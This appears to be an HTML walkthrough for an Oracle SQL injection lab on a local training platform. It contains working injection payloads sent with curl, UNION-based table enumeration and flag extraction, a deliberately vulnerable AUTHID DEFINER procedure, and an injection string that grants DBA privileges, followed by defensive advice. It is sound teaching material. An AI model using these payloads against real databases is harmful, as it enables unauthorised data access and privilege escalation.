<h4>Step 1: Test Normal Search</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Search</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab14" \<br> --data-urlencode "user=' OR 1=1 -- "<br><br>
        <span class="prompt">Input: </span>' OR 1=1 -- <br>
        <span class="prompt">SQL: </span>SELECT id, action, performed, timestamp FROM audit_log WHERE performed = '' OR 1=1 -- '<br><br>
        <span class="prompt">Output:</span><br>
        <strong>Action:</strong> LOGIN: <strong>Performed By:</strong> admin: <strong>Timestamp:</strong> 2026-03-20 08:15:00<br>
        <strong>Action:</strong> GRANT DBA: <strong>Performed By:</strong> sysdba: <strong>Timestamp:</strong> 2026-03-20 09:30:00<br>
        <strong>Action:</strong> CREATE TABLE -- <strong>Performed By:</strong> admin -- <strong>Timestamp:</strong> 2026-03-20 10:00:00<br>
        <strong>Action:</strong> DROP USER temp -- <strong>Performed By:</strong> sysdba -- <strong>Timestamp:</strong> 2026-03-21 14:22:00
    </div>
</div>

<h4>Step 2: Enumerate Tables and Extract Flag</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. UNION Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "..." --data-urlencode "user=XXXXNOMATCH' UNION SELECT 0, table_name, 'x', 'x' FROM user_tables -- "<br>
        <span class="prompt">Output: </span>AUDIT_LOG, <strong>PRIVESC_FLAGS</strong><br><br>
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab14" \<br> --data-urlencode "user=XXXXNOMATCH' UNION SELECT id, flag, 'x', 'x' FROM privesc_flags -- "<br>
        <span class="prompt">Output: </span><strong>Action:</strong> <strong>FLAG{or_db4_gr4nt_pr1v3sc}</strong>
    </div>
</div>

<h4>Step 3: AUTHID DEFINER Privilege Escalation (Conceptual)</h4>
<p>
    Oracle PL/SQL procedures with <code>AUTHID DEFINER</code> (the default) run with the
    <strong>owner's</strong> privileges. If a DBA-owned procedure has SQL injection, any user
    with EXECUTE permission inherits DBA privileges.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. Vulnerable DBA Procedure</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">DBA creates: </span><br>
        CREATE OR REPLACE PROCEDURE lookup_user(p_name VARCHAR2)<br>
        AUTHID DEFINER : runs with SYS privileges!<br>
        AS v_sql VARCHAR2(4000);<br>
        BEGIN<br>
        &nbsp;&nbsp;v_sql := 'SELECT * FROM users WHERE name = ''' || p_name || '''';<br>
        &nbsp;&nbsp;EXECUTE IMMEDIATE v_sql; . SQL injection!<br>
        END;<br><br>
        <span class="prompt">DBA grants: </span>GRANT EXECUTE ON lookup_user TO low_priv_user;
    </div>
</div>

<h4>Step 4: Exploiting for DBA Privileges</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. Privilege Escalation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Attacker calls:</span><br>
        EXEC SYS.lookup_user('x'' || EXECUTE IMMEDIATE<br>
        &nbsp;&nbsp;''GRANT DBA TO low_priv_user'' || ''');<br><br>
        <span class="prompt">Result:</span><br>
        1. Procedure runs as SYS (AUTHID DEFINER)<br>
        2. EXECUTE IMMEDIATE runs GRANT DBA with SYS privileges<br>
        3. low_priv_user is now DBA!
    </div>
</div>

<h4>Step 5: Finding Vulnerable Procedures</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Find DEFINER procs: </span>SELECT owner, object_name, authid<br>
        &nbsp;&nbsp;FROM all_procedures WHERE authid = 'DEFINER' AND owner IN ('SYS','SYSTEM');<br><br>
        <span class="prompt">Check grants:       </span>SELECT * FROM all_tab_privs<br>
        &nbsp;&nbsp;WHERE grantee = USER AND privilege = 'EXECUTE';<br><br>
        <span class="prompt">Search dynamic SQL:  </span>SELECT * FROM all_source<br>
        &nbsp;&nbsp;WHERE UPPER(text) LIKE '%EXECUTE IMMEDIATE%' AND owner = 'SYS';
    </div>
</div>

<h4>Step 6: Submit the Flag</h4>
<p>
    Copy the flag and paste it into the verification form:
    <code>FLAG{or_db4_gr4nt_pr1v3sc}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/oracle/lab14" \<br> --data-urlencode "user=XXXXNOMATCH' UNION SELECT id, flag, 'x', 'x' FROM privesc_flags -- "<br><br>
        <span class="prompt">// Verified output:</span><br>
        <strong>Action:</strong> FLAG{or_db4_gr4nt_pr1v3sc}
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> Oracle's <code>AUTHID DEFINER</code> model means procedures run with
    the owner's privileges. If a DBA-owned procedure uses dynamic SQL (EXECUTE IMMEDIATE) with
    unsanitized input, any user with EXECUTE permission can escalate to DBA. This pattern has appeared
    in numerous CVEs (DBMS_EXPORT_EXTENSION, DBMS_JAVA, DBMS_XMLGEN). Defense: use
    <code>AUTHID CURRENT_USER</code>, parameterize all dynamic SQL, audit DEFINER procedures, and apply
    Oracle Critical Patch Updates.
</div>
